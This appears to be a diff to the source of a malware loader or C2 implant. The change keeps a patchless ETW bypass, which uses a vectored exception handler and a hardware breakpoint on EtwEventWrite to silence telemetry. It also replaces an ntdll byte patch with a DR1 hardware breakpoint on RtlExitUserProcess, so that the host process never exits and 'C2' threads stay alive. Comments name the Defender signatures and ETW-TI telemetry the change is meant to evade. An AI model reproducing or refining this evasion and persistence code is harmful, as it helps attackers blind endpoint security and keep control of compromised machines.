@@ -35,6 +35,15 @@ static PVOID g_hVeh = NULL;
 // Guard flag: prevents infinite NtContinue loop
 static volatile BOOL g_bHwBpSet = FALSE;
 
+// Patchless exit hook state (DLL builds only)
+#ifdef BUILD_DLL
+static PVOID           g_pRtlExitUserProcess = NULL;
+static volatile BOOL   g_bExitBpSet          = FALSE;
+// Cached NtWaitForSingleObject for blocking the thread inside HwBpVehHandler (exit-hook path)
+typedef NTSTATUS(NTAPI* fnNtWait2)(HANDLE, BOOLEAN, PLARGE_INTEGER);
+static fnNtWait2       g_pfnNtWait           = NULL;
+#endif
+
 // -----------------------------------------------
 // Vectored Exception Handler
 // Catches STATUS_SINGLE_STEP (hardware breakpoint hit)
@@ -50,13 +59,26 @@ static LONG WINAPI HwBpVehHandler(PEXCEPTION_POINTERS pExInfo) {
 
     PCONTEXT ctx = pExInfo->ContextRecord;
 
-    // EtwEventWrite hit -> return STATUS_SUCCESS (0)
+    // DR0: EtwEventWrite -> short-circuit, return STATUS_SUCCESS
     if (g_pEtwEventWrite && ctx->Rip == (ULONG_PTR)g_pEtwEventWrite) {
         ctx->Rax = 0;
         ctx->Rip = *(ULONG_PTR*)ctx->Rsp;
         ctx->Rsp += sizeof(ULONG_PTR);
         return EXCEPTION_CONTINUE_EXECUTION;
     }
+
+#ifdef BUILD_DLL
+    // DR1: RtlExitUserProcess -> block calling thread via NtWaitForSingleObject.
+    // Keeps C2 alive in other threads without a CPU-burning RDTSC spin loop
+    // (spin pattern triggers Win32/Bearfoos.A!ml).
+    if (g_pRtlExitUserProcess && ctx->Rip == (ULONG_PTR)g_pRtlExitUserProcess) {
+        if (g_pfnNtWait) {
+            LARGE_INTEGER liTimeout;
+            liTimeout.QuadPart = -600000000LL;  // 60 seconds per wait
+            for (;;) g_pfnNtWait((HANDLE)-1, FALSE, &liTimeout);
+        }
+    }
+#endif
 
     return EXCEPTION_CONTINUE_SEARCH;
 }
@@ -114,13 +136,14 @@ BOOL PatchlessEtw(IN PAPI_HASHING pApi) {
     if (!pNtContinue)
         return FALSE;
 
-    // --- Register VEH (first handler in chain) ---
+    // --- Register VEH (first handler in chain, skipped if InstallExitHookPatchless already did it) ---
 
-    g_hVeh = pRtlAddVeh(1, (PVOID)HwBpVehHandler);
-    if (!g_hVeh)
-        return FALSE;
-
-    LOG("[+] Patchless ETW: VEH registered");
+    if (!g_hVeh) {
+        g_hVeh = pRtlAddVeh(1, (PVOID)HwBpVehHandler);
+        if (!g_hVeh)
+            return FALSE;
+        LOG("[+] Patchless ETW: VEH registered");
+    }
 
     // --- Set hardware breakpoint via RtlCaptureContext + NtContinue ---
     // RtlCaptureContext captures the current thread context (including RIP).
@@ -139,8 +162,16 @@ BOOL PatchlessEtw(IN PAPI_HASHING pApi) {
     if (!g_bHwBpSet) {
         g_bHwBpSet = TRUE;
 
-        ctx.Dr0 = (ULONG_PTR)g_pEtwEventWrite;  // DR0 = EtwEventWrite
-        ctx.Dr7 = (1 << 0);                      // L0: local enable, execute-on-1-byte
+        ctx.Dr0 = (ULONG_PTR)g_pEtwEventWrite;  // DR0 = EtwEventWrite (execute BP)
+        ctx.Dr7 = (1 << 0);                      // L0: local enable DR0
+
+#ifdef BUILD_DLL
+        // Preserve DR1 exit-hook breakpoint if already installed from DllMain
+        if (g_pRtlExitUserProcess) {
+            ctx.Dr1  = (ULONG_PTR)g_pRtlExitUserProcess;
+            ctx.Dr7 |= (1 << 2);                 // L1: local enable DR1
+        }
+#endif
 
         ctx.ContextFlags |= CONTEXT_DEBUG_REGISTERS;
         pNtContinue(&ctx, FALSE);
@@ -176,8 +207,12 @@ VOID CleanupEvasion(IN PAPI_HASHING pApi) {
         (fnRtlRemoveVectoredExceptionHandler)pApi->pGetProcAddress(
             (HMODULE)pNtdll, (LPCSTR)xRemVeh);
 
+#ifndef BUILD_DLL
+    // DLL builds: VEH must stay registered — DR1 exit hook on the primary thread
+    // still needs HwBpVehHandler to fire after ETW bypass is torn down.
     if (pRtlRemoveVeh)
         pRtlRemoveVeh(g_hVeh);
+#endif
 
     // Clear hardware breakpoints via RtlCaptureContext + NtContinue
     // Reuse g_bHwBpSet (TRUE) as guard to prevent infinite NtContinue loop
@@ -199,80 +234,105 @@ VOID CleanupEvasion(IN PAPI_HASHING pApi) {
         if (g_bHwBpSet) {
             g_bHwBpSet = FALSE;
             ctx.Dr0 = 0;
+#ifdef BUILD_DLL
+            // Keep DR1 active: exit hook must persist after ETW bypass is cleaned up
+            ctx.Dr1 = g_pRtlExitUserProcess ? (ULONG_PTR)g_pRtlExitUserProcess : 0;
+            ctx.Dr7 = g_pRtlExitUserProcess ? (1 << 2) : 0;
+#else
             ctx.Dr1 = 0;
             ctx.Dr7 = 0;
+#endif
             ctx.ContextFlags |= CONTEXT_DEBUG_REGISTERS;
             pNtContinue(&ctx, FALSE);
         }
     }
 
-    // Clear all evasion state
-    g_hVeh           = NULL;
+    // Clear evasion state — ETW bypass is done
     g_pEtwEventWrite = NULL;
     g_bHwBpSet       = FALSE;
+#ifndef BUILD_DLL
+    g_hVeh = NULL;
+#endif
 
     LOG("[+] Evasion cleanup: VEH removed, debug registers cleared");
 }
 
 // -----------------------------------------------
-// Exit Hook - Prevent Host Process Termination
+// Patchless Exit Hook (DLL builds only)
 //
-// Patches RtlExitUserProcess in ntdll with an infinite
-// PAUSE loop so that ExitProcess never completes.
+// Registers a VEH + sets DR1 hardware execute-breakpoint
+// on RtlExitUserProcess so that ExitProcess never
+// completes without writing any bytes to ntdll.
 //
-// This prevents the ENTIRE exit flow:
-//   - NtTerminateProcess(NULL)  — no thread killing
-//   - LdrShutdownProcess()      — no DLL_PROCESS_DETACH
-//   - NtTerminateProcess(-1)    — no process termination
+// Replaces the byte-patch approach (F3 90 EB FC) which
+// Defender detects in memory as Win32/Bearfoos.B!ml.
 //
-// Without this, LdrShutdownProcess runs DLL_PROCESS_DETACH
-// which cleans up winsock/winhttp state and kills C2 comms
-// even if the process itself stays alive.
+// DR1 is set on the calling thread (host EXE primary
+// thread, which is where DllMain runs and where
+// ExitProcess is subsequently called).
 //
-// Called from DllMain (Loader Lock safe: ntdll-only calls).
+// Called from DllMain — safe: ntdll-only calls, no
+// loader lock acquired by RtlAddVectoredExceptionHandler
+// or RtlCaptureContext or NtContinue.
 // -----------------------------------------------
-typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory2)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
-
-BOOL InstallExitHook(IN PVOID pNtdll) {
+#ifdef BUILD_DLL
+BOOL InstallExitHookPatchless(IN PVOID pNtdll) {
 
     if (!pNtdll)
         return FALSE;
 
-    // Resolve RtlExitUserProcess (target to patch)
-    PVOID pRtlExit = FetchExportAddress(pNtdll, RtlExitUserProcess_JOAAT);
-    if (!pRtlExit)
+    // Resolve target function
+    g_pRtlExitUserProcess = FetchExportAddress(pNtdll, RtlExitUserProcess_JOAAT);
+    if (!g_pRtlExitUserProcess)
         return FALSE;
 
-    // Resolve NtProtectVirtualMemory (to make ntdll page writable)
-    fnNtProtectVirtualMemory2 pNtProtect =
-        (fnNtProtectVirtualMemory2)FetchExportAddress(pNtdll, NtProtectVirtualMemory_JOAAT);
-    if (!pNtProtect)
+    // Cache NtWaitForSingleObject for the exit-hook spin inside HwBpVehHandler
+    g_pfnNtWait = (fnNtWait2)FetchExportAddress(pNtdll, NtWaitForSingleObject_JOAAT);
+
+    // Register shared VEH (handles DR0=ETW and DR1=exit hook with the same handler).
+    // Guard: PatchlessEtw will reuse g_hVeh if it finds it already set.
+    if (!g_hVeh) {
+        fnRtlAddVectoredExceptionHandler pRtlAddVeh =
+            (fnRtlAddVectoredExceptionHandler)FetchExportAddress(
+                pNtdll, RtlAddVectoredExceptionHandler_JOAAT);
+        if (!pRtlAddVeh)
+            return FALSE;
+
+        g_hVeh = pRtlAddVeh(1, (PVOID)HwBpVehHandler);
+        if (!g_hVeh)
+            return FALSE;
+    }
+
+    // Resolve RtlCaptureContext + NtContinue to set DR1 without ETW-TI telemetry
+    fnRtlCaptureContext pRtlCaptureCtx =
+        (fnRtlCaptureContext)FetchExportAddress(pNtdll, RtlCaptureContext_JOAAT);
+    fnNtContinue pNtContinue =
+        (fnNtContinue)FetchExportAddress(pNtdll, NtContinue_JOAAT);
+    if (!pRtlCaptureCtx || !pNtContinue)
         return FALSE;
 
-    // Change page protection to RWX
-    PVOID  pAddr = pRtlExit;
-    SIZE_T sSize = 4;
-    ULONG  dwOld = 0;
-    NTSTATUS status = pNtProtect((HANDLE)-1, &pAddr, &sSize, PAGE_EXECUTE_READWRITE, &dwOld);
-    if (!NT_SUCCESS(status))
-        return FALSE;
+    // Set DR1 = RtlExitUserProcess via RtlCaptureContext + NtContinue.
+    // g_bExitBpSet guards against infinite NtContinue re-entry:
+    //   1st pass: g_bExitBpSet=FALSE → set TRUE, modify ctx, NtContinue
+    //   2nd pass: g_bExitBpSet=TRUE  → fall through
+    CONTEXT ctx;
+    MemSet(&ctx, 0, sizeof(ctx));
+    pRtlCaptureCtx(&ctx);
 
-    // Overwrite with: PAUSE; JMP $-2  (infinite low-CPU loop)
-    // F3 90    = pause
-    // EB FC    = jmp (RIP - 4) → back to pause
-    PBYTE p = (PBYTE)pRtlExit;
-    p[0] = 0xF3;   // pause
-    p[1] = 0x90;
-    p[2] = 0xEB;   // jmp short
-    p[3] = 0xFC;   // offset = -4 (back to pause)
+    if (!g_bExitBpSet) {
+        g_bExitBpSet = TRUE;
 
-    // Restore original protection
-    pAddr = pRtlExit;
-    sSize = 4;
-    pNtProtect((HANDLE)-1, &pAddr, &sSize, dwOld, &dwOld);
+        ctx.Dr1 = (ULONG_PTR)g_pRtlExitUserProcess;
+        ctx.Dr7 = (1 << 2);  // L1: local enable DR1, execute condition (bits 20-21 = 00)
+
+        ctx.ContextFlags |= CONTEXT_DEBUG_REGISTERS;
+        pNtContinue(&ctx, FALSE);
+        // Unreachable — NtContinue resumes at pRtlCaptureCtx's return point
+    }
 
     return TRUE;
 }
+#endif
 
 // -----------------------------------------------
 // BlindDllNotifications
